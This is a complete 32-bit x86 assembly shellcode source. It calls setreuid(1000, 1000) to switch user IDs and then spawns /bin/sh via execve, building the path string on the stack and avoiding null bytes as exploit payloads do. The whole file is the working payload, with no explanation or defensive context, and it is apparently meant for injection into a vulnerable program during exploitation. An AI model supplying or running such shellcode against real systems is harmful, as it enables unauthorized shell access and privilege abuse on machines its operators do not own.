bits 32
section .text
global _start

_start:
	
	; setreuid(1000, 1000)
	xor eax, eax
	xor ebx, ebx
	mov bx, 1000
	mov ecx, ebx
	
	push 0x46
	pop eax ; SYS_setreuid
	int 0x80 

	; execve("/bin/sh", NULL, NULL)
	xor ecx, ecx
	xor edx, edx
	
	push edx
	push 0x68732f2f ; //sh
	push 0x6e69622f ; /bin
	mov ebx, esp

	mov al, 0xb
	int 0x80